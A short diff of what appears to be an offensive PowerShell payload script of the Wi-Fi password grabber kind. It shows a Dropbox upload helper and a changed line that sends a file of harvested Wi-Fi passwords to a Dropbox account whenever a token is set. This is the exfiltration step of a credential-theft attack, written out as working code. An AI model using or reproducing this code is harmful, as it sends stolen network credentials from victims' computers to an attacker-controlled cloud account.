@@ -29,7 +29,7 @@ $headers.Add("Content-Type", 'application/octet-stream')
 Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
 }
 
-if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TEMP/--wifi-pass.txt}
+if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f C:\Users\$env:UserName\Desktop\WIFI.txt}
 
 ############################################################################################################################################################
 
